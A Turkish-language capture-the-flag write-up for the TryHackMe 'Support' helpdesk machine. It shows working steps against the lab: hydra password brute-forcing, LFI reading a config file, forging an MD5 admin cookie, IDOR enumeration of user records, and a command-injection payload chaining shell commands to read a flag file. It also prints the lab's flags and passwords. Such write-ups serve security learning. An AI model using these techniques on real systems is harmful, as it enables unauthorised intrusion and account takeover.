# TryHackMe — Support Writeup

Support, TryHackMe üzerinde yer alan bir makine. Kurumsal bir helpdesk panelini simüle ediyor ve içerisinde zayıf kimlik doğrulama, LFI, IDOR ve Command Injection zafiyetlerini bir arada barındırıyor. Bu yazıda makineyi baştan sona nasıl ele geçirdiğimi anlatıyorum.

---

## Keşif

İlk adım olarak hedef üzerinde açık portları ve çalışan servisleri tespit etmek için `nmap` ile tam port taraması gerçekleştirdim.

```bash
nmap -sS -sC -sV -p- 10.112.177.56
```

> [SCREENSHOT: nmap tarama çıktısı]

Tarama sonucunda 80 numaralı portta bir web uygulaması çalıştığını gördüm ve incelemeye buradan başladım.

---

## Web Uygulamasının İncelenmesi

`http://10.112.177.56` adresine gittiğimde bir login ekranı ile karşılaştım. Sayfada şu açıklama yer alıyordu:

```
Support Operations Panel
Internal platform for managing support operations, infrastructure access, and incident response.

- Ticket management
- Internal APIs
- System diagnostics
```

> [SCREENSHOT: login ekranı]

Login formunun e-posta alanında örnek/varsayılan olarak `help@support.thm` adresinin bulunduğunu fark ettim. Bu, geçerli bir kullanıcı adı olabileceğine işaret ediyordu ve brute-force denemesi için iyi bir başlangıç noktasıydı.

Login öncesi erişilebilecek başka bir şey olup olmadığını görmek için `ffuf` ile dizin taraması da yaptım, ancak kimlik doğrulama gerektirmeyen kullanışlı bir dizine rastlamadım. Bu yüzden bu kısmı bırakıp doğrudan brute-force denemesine geçtim.

---

## Brute-Force ile Kimlik Bilgilerinin Ele Geçirilmesi

`help@support.thm` kullanıcı adını sabit tutup `hydra` ile parolayı bulmaya çalıştım.

```bash
hydra -l help@support.thm \
-P /usr/share/wordlists/rockyou.txt \
10.112.177.56 \
http-post-form \
"/:email=^USER^&password=^PASS^:F=Invalid"
```

> [SCREENSHOT: hydra çıktısı]

Kısa sürede sonuç geldi:

```
[80][http-post-form] host: 10.112.177.56 login: help@support.thm password: snoopy
```

Bu bilgilerle giriş yaptım.

---

## LFI ile config Dosyasının Okunması

Giriş yaptıktan sonra panelde bir skin değiştirme özelliği olduğunu fark ettim:

```
http://10.112.177.56/dashboard.php?skin=default
http://10.112.177.56/dashboard.php?skin=red
http://10.112.177.56/dashboard.php?skin=green
http://10.112.177.56/dashboard.php?skin=blue
```

> [SCREENSHOT: skin değiştirme seçenekleri]

Sayfada sadece 3-4 tema seçeneği görünmesine rağmen bu isimlerin bir yerden dinamik olarak çekildiğini düşündüm. `skin` parametresinin bir dosya adı/yolu olarak kullanıldığını tahmin ederek LFI ihtimalini test etmeye karar verdim ve `/etc/passwd`, config dosyaları, `.sql` uzantılı dosyalar gibi klasik hedefleri denemeye başladım.

```
http://10.112.177.56/dashboard.php?skin=../config
```

Bu isteği attığımda sayfanın normal görünümünde bir bozulma oldu; içerik doğrudan ekrana basılmadı ama sayfa davranışındaki değişiklik bir şey bulduğumu gösteriyordu. Sayfa kaynağını inceleyince aradığım veriye ulaştım:

> [SCREENSHOT: sayfa kaynağında config içeriği]

```php
<?php
MASTER_PASSWORD = 'support@110';
SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

Elimde artık bir master password vardı (`support@110`) ancak hangi kullanıcıya ait olduğunu bilmiyordum. Araştırmaya devam ettim.

---

## Cookie Manipülasyonu ile Admin Yetkisi Kazanma

Tarayıcıda oturuma ait cookie'leri incelediğimde ilginç bir değer dikkatimi çekti:

```
isITUser = 68934a3e9455fa72420237eb05902327
PHPSESSID = a63hjhr4eanskklcb4eef12o3b
```

`isITUser` değeri 32 karakter uzunluğunda, rakam ve küçük harflerden oluşuyordu — klasik bir MD5 hash formatına benziyordu. `false` kelimesinin MD5 karşılığını hesapladığımda değerin birebir eşleştiğini gördüm:

```
md5("false") = 68934a3e9455fa72420237eb05902327
```

Bu, cookie'nin aslında bir yetki bilgisini hash'lenmiş şekilde tuttuğunu gösteriyordu. `true` kelimesinin MD5 karşılığını hesaplayıp bu değeri cookie'ye yerleştirdim:

```
md5("true") = b326b5062b2f0e69046810717534cb09
```

> [SCREENSHOT: Burp'ta cookie değerinin değiştirilmesi]

Bu değeri isteğe ekleyip sunucuya yolladığımda admin yetkisiyle panele erişim sağladım.

---

## IDOR ile Kullanıcı Bilgilerinin Sızdırılması

Admin panelinde bir "View API" butonu vardı. Tıkladığımda kendi kullanıcı profilimi sorgulayan bir endpoint ile karşılaştım:

```
Internal User API
As a helpdesk user, you can query your own profile: /user/3

GET /user/3
```

**Yanıt:**

```json
{
  "email": "help@support.thm",
  "2FA": false,
  "admin": false
}
```

> [SCREENSHOT: /user/3 API yanıtı]

Endpoint'in `id` parametresine göre çalıştığını görünce, erişim kontrolü olup olmadığını test etmek için `id` değerini manuel olarak değiştirdim. Beklediğim gibi herhangi bir yetki kontrolü yoktu ve diğer kullanıcıların profillerine de erişebildim — klasik bir IDOR zafiyeti.

```
GET /user/1
```
```json
{
  "email": "specialadmin@support.thm",
  "2FA": false,
  "admin": true
}
```

```
GET /user/2
```
```json
{
  "email": "IT@support.thm",
  "2FA": false,
  "admin": false
}
```

> [SCREENSHOT: /user/1 ve /user/2 API yanıtları]

`specialadmin@support.thm` hesabının `admin: true` olduğunu görünce, daha önce config dosyasından elde ettiğim `support@110` parolasının bu hesaba ait olabileceğini düşündüm.

---

## Flag #1

`specialadmin@support.thm` hesabıyla `support@110` parolasını doğrudan denediğimde giriş başarısız oldu. Parolada küçük bir varyasyon deneyerek `@` karakterini kaldırdım ve `support110` şeklinde tekrar denedim. Bu sefer giriş başarılı oldu.

> [SCREENSHOT: specialadmin hesabıyla başarılı giriş]

```
FLAG 1: THM{I_AM_ADMIN999}
```

---

## Command Injection ile Yetkili Erişim

Admin panelinde sistem tanılama amaçlı bir tarih/saat özelliği bulunuyordu. Bu özelliği tetiklediğimde sayfada şu şekilde bir çıktı görüntüleniyordu:

```
Date: Thu Jul 30 18:00:08 UTC 2026
```

> [SCREENSHOT: sistem tarihini gösteren panel]

Bu isteği Burp Suite ile yakaladığımda, tarih bilgisinin sunucu tarafında çalıştırılan bir sistem komutu üzerinden üretildiğini gördüm. İstekte kullanılan parametre şu şekildeydi:

```
sys=date+%2B%22%25H%3A%25M%3A%25S%22
```

URL decode edildiğinde bu parametrenin `date +"%H:%M:%S"` komutuna karşılık geldiğini fark ettim. Parametrenin doğrudan bir shell komutu olarak çalıştırıldığını düşünerek, komut zincirleme (`;`) ile ek komutlar eklemeyi denedim:

```
sys=date;ls -al;cat /home/ubuntu/user.txt
```

> [SCREENSHOT: Burp'ta değiştirilmiş sys parametresi ve komut çıktısı]

İstek başarıyla çalıştı ve `/home/ubuntu/user.txt` dosyasının içeriği doğrudan yanıt olarak döndü.

```
FLAG 2: THM{GOT_THE_FLAG001}
```

---

**Flag 1:** `THM{I_AM_ADMIN999}`
**Flag 2:** `THM{GOT_THE_FLAG001}`
